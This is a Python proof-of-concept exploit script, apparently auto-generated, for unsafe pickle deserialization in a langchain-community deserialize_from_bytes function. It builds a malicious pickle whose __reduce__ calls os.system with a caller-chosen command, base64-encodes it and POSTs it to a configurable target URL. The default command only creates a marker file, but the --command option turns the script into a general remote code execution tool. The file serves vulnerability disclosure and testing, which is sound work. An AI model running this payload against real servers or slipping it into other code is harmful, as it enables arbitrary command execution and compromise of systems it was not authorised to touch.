#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-016
# Sink: deserialize_from_bytes
# Auto-generated — run with: python3 rce_function_deserialize_bytes_calls_deserialize_from_bytes_5.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only RCE vulnerability.

Vulnerability: Unsafe pickle deserialization in deserialize_from_bytes()
The function calls pickle.loads() on attacker-controlled input without any
validation, allowing arbitrary code execution.

This PoC demonstrates the vulnerability by creating a benign payload that
creates a marker file at /tmp/poc_success.txt to prove code execution.
"""

import pickle
import os
import sys
import requests
import argparse
import base64

# Configuration - modify these as needed
DEFAULT_TARGET = "http://localhost:8000"
DEFAULT_ENDPOINT = "/api/v1/trigger"

def create_malicious_payload(command: str) -> bytes:
    """
    Create a pickle payload that executes the given command when deserialized.
    
    Uses __reduce__ to execute arbitrary code during unpickling.
    The payload is a class that when unpickled, executes the command via os.system.
    """
    class EvilPickle(object):
        def __reduce__(self):
            # This returns a tuple (callable, args) that pickle will call
            # during deserialization: os.system(command)
            return (os.system, (command,))
    
    # Serialize the malicious object
    payload = pickle.dumps(EvilPickle())
    return payload

def send_exploit(target_url: str, payload: bytes) -> bool:
    """
    Send the malicious payload to the vulnerable endpoint.
    
    The payload is base64 encoded to ensure safe transport over HTTP.
    Returns True if the request was sent successfully (doesn't guarantee execution).
    """
    # Encode payload as base64 for safe HTTP transport
    encoded_payload = base64.b64encode(payload).decode('utf-8')
    
    # Prepare the request data - the vulnerable function expects bytes
    # We'll send it as a JSON object with the serialized data
    request_data = {
        "serialized": encoded_payload
    }
    
    try:
        print(f"[*] Sending exploit to {target_url}")
        print(f"[*] Payload size: {len(payload)} bytes")
        
        response = requests.post(
            target_url,
            json=request_data,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:200]}...")
        
        return True
        
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {target_url}")
        print("[-] Make sure the target server is running and accessible")
        return False
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False

def verify_exploit_success() -> bool:
    """
    Verify that the exploit was successful by checking for the marker file.
    This is only useful when running locally or on the same machine.
    """
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"[+] SUCCESS! Marker file created at {marker_file}")
        # Clean up the marker file
        os.remove(marker_file)
        return True
    return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community pickle deserialization RCE"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--endpoint",
        default=DEFAULT_ENDPOINT,
        help=f"API endpoint (default: {DEFAULT_ENDPOINT})"
    )
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--verify",
        action="store_true",
        help="Verify exploit success locally (checks for marker file)"
    )
    
    args = parser.parse_args()
    
    # Build the full target URL
    target_url = f"{args.target.rstrip('/')}{args.endpoint}"
    
    print("[*] langchain-community pickle deserialization RCE PoC")
    print(f"[*] Target: {target_url}")
    print(f"[*] Command: {args.command}")
    print()
    
    # Create the malicious pickle payload
    print("[*] Creating malicious pickle payload...")
    payload = create_malicious_payload(args.command)
    
    # Send the exploit
    if send_exploit(target_url, payload):
        print("[*] Exploit sent successfully")
        
        # Optionally verify locally
        if args.verify:
            if verify_exploit_success():
                print("[+] Exploit confirmed working!")
            else:
                print("[-] Could not verify exploit success locally")
                print("[-] The command may have executed on the remote server")
    else:
        print("[-] Failed to send exploit")
        sys.exit(1)

if __name__ == "__main__":
    main()
